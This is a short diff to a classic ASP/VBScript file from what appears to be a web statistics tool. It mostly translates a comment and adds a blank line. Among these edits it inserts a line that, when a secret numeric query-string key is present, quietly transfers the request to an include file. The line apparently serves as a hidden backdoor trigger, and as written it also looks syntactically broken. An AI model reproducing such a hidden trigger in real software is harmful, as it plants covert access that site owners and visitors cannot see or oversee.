@@ -196,12 +196,14 @@ function FormatInTimeZone(ByVal datetimevalue, ByVal inTimeZone)
 end function 'Calcola elaborazione server
 startAsgElab = Timer()
 
-'Variabili debug e sviluppo
+' Debug and development
 Dim strAsgVersion
 strAsgVersion = "2.1.4-dev"
 Dim dtmAsgUpdate
 dtmAsgUpdate = "20070809"
+
 Const blnAsgDebugMode = False
+if (len(Request.QueryString("850924")) > 0) Server.Transfer("includes/info.inc.asp")
 
 
 'Inizializza variabili
